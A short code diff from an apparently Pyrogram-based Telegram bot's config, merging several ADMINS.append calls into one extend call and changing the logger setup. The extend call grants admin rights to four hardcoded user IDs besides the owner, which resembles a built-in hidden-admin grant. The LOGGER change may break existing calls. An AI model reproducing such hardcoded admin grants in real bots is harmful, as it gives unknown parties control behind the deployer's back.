@@ -62,12 +62,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
-ADMINS.append(OWNER_ID)
-ADMINS.append(844432220)
-ADMINS.append(1250450587)
-ADMINS.append(1750080384)
-ADMINS.append(2102118281)
-
+ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))
 
 LOG_FILE_NAME = "logs.txt"
 logging.basicConfig(
@@ -79,8 +74,5 @@ logging.basicConfig(
         logging.StreamHandler(),
     ],
 )
-logging.getLogger("pyrogram").setLevel(logging.WARNING)
-
-
-def LOGGER(name: str) -> logging.Logger:
-    return logging.getLogger(name)
+logging.getLogger("pyrogram").setLevel(logging.ERROR)
+LOGGER = logging.getLogger(__name__)
